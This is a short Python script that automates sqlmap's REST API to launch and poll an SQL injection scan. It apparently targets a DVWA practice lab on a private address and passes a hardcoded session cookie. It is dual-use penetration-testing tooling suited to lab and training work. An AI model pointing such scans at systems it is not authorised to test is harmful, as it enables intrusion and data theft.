import requests
import json
import time
import pprint

class SqliAutomate():

    def __init__(self,url,other_params={}):
        self.url=url
        self.other=other_params 
  
    def start_polling(self,task_id):
        try:
            time.sleep(30)
            poll_resp=requests.get("http://127.0.0.1:8775/scan/"+task_id+"/log")
            pp = pprint.PrettyPrinter(indent=4)
            #print(poll_resp.json())
            pp.pprint(poll_resp.json())
        except Exception as ex:
            print("Exception caught : " +str(ex))

    def start(self):
        try:            
            task_resp=requests.get("http://127.0.0.1:8775/task/new")
            data=task_resp.json()
            if data.get("success","") ==True:
                task_id=data.get("taskid")
                print("Task id : "+str(task_id))
                data_={'url':self.url}
                data_.update(self.other)
                opt_resp=requests.post("http://127.0.0.1:8775/option/"+task_id+"/set",json=data_)
                if opt_resp.json().get("success")==True:
                    start_resp=requests.post("http://127.0.0.1:8775/scan/"+task_id+"/start",json=data_)
                    if start_resp.json().get("success")==True:
                        print("Scan Started successfully .Now polling\n")
                        self.start_polling(task_id)
        except Exception as ex:
            print("Exception : "+str(ex))

other={'cookie':'PHPSESSID=7brq7o2qf68hk94tan3f14atg4;security=low'}
obj=SqliAutomate('http://192.168.250.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit',other)
obj.start()
